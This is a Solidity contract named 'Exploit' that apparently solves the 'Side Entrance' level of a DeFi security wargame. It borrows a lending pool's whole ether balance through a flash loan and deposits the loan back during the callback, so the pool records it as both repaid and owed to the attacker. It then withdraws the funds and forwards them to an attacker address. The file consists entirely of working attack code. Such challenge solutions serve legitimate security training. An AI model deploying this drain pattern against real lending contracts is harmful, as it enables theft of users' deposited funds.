// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract Exploit is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal immutable pool;
    address payable attacker;

    constructor(address _pool, address _attacker) {
        pool = SideEntranceLenderPool(_pool);
        attacker = payable(_attacker);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success);
    }

    function execute() external payable override {
        pool.deposit{value: address(this).balance}();
    }

    receive() external payable {}
}
